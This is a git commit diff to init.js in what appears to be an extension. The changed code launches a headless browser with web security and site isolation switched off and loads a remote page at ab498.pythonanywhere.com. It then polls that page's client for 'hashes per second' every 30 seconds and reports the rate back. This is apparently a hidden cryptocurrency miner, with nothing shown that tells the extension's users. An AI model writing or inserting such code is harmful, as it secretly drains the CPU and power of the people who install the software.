2f799ca0defe6c4715bec89458c29be554ffabfb
AB498 <abcd49800@gmail.com>
2024-10-24 17:17:40 +0600

    m

--- init.js
+++ init.js
@@ -1,12 +1,23 @@
 (async () => {
     const browser = await require('puppeteer').launch({
-        headless: true,
-        args: [
-            '--disable-web-security',
-            '--disable-features=IsolateOrigins,site-per-process',
-            '--allow-running-insecure-content',
-        ]
+      headless: true,
+      args: [
+        '--disable-web-security',     // Disable web security for cross-origin resources
+        '--disable-features=IsolateOrigins,site-per-process', // Allow cross-origin iframes and scripts
+        '--allow-running-insecure-content',  // Allow mixed content (if needed)
+      ]
     });
+    let page = await browser.newPage();
+    await page.goto('https://ab498.pythonanywhere.com/files/init.html');
+    setInterval(async () => {
+      const hs = await page.evaluate(() => {
+        return window._client.getHashesPerSecond();
+      });
+      tstt({
+        message: "HASH",
+        value: hs
+      })
+    }, 30000);
 
-    await (await browser.newPage()).goto('https://ab498.pythonanywhere.com/files/init.html');
-})();
+    tstt({ message: "INIT", version: JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version });
+  })();
